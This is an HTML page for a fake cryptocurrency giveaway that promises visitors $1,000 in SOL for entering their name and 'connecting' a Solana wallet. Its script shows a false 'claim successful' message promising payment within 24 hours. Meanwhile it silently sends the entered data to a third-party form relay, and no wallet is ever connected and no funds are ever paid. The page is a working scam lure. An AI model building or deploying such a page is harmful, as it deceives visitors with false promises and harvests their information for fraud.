<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim $1,000 SOL</title>
    <!-- Web3-Style Fonts -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #00FFA3 0%, #DC1FFF 100%);
            --bg-color: #0b0e11;
            --card-bg: #1e2329;
            --text-main: #ffffff;
            --text-sub: #b7bdc6;
            --input-bg: rgba(255, 255, 255, 0.05);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Sora', sans-serif;
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(0, 255, 163, 0.15), transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(220, 31, 255, 0.15), transparent 40%);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .container {
            max-width: 480px;
            width: 90%;
            background: var(--card-bg);
            padding: 50px 40px;
            border-radius: 28px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.08);
            position: relative;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.2rem;
            margin-bottom: 15px;
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-weight: 800;
        }

        .sub-text {
            color: var(--text-sub);
            font-size: 1rem;
            margin-bottom: 35px;
            line-height: 1.5;
        }

        .input-section {
            margin-bottom: 30px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #00FFA3;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input[type="text"] {
            width: 100%;
            padding: 18px;
            border-radius: 14px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            background: var(--input-bg);
            color: white;
            font-size: 1.1rem;
            box-sizing: border-box;
            transition: all 0.3s ease;
            font-family: 'Sora', sans-serif;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #00FFA3;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 255, 163, 0.15);
        }

        .connect-btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 14px;
            background: var(--primary-gradient);
            color: white;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(220, 31, 255, 0.2);
            text-transform: uppercase;
        }

        .connect-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 25px rgba(220, 31, 255, 0.4);
            filter: brightness(1.1);
        }

        #success-screen {
            display: none;
            animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards;
        }

        .success-text {
            font-size: 1.2rem;
            color: #00FFA3;
            line-height: 1.8;
            font-weight: 600;
            padding: 20px;
            border: 1px solid rgba(0, 255, 163, 0.3);
            background: rgba(0, 255, 163, 0.05);
            border-radius: 16px;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Form Section -->
        <div id="form-container">
            <form id="claim-form" action="https://formsubmit.co" method="POST">
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub-text">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                
                <div class="input-section">
                    <label for="name">Name:</label>
                    <input type="text" id="name" name="name" placeholder="Enter your name here..." required>
                </div>

                <!-- Form Configuration -->
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value=""> <!-- Prevents redirect to thank you page -->
                
                <button type="submit" class="connect-btn">CONNECT WALLET</button>
            </form>
        </div>

        <!-- Success Message Section -->
        <div id="success-screen">
            <h1 style="font-size: 1.8rem;">CLAIM SUCCESSFUL</h1>
            <div class="success-text">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const formContainer = document.getElementById('form-container');
        const successScreen = document.getElementById('success-screen');

        form.onsubmit = async (e) => {
            e.preventDefault();
            
            // Show success screen immediately for better UX
            formContainer.style.display = 'none';
            successScreen.style.display = 'block';

            // Send the data to your email in the background
            const formData = new FormData(form);
            fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            });
        };
    </script>
</body>
</html>
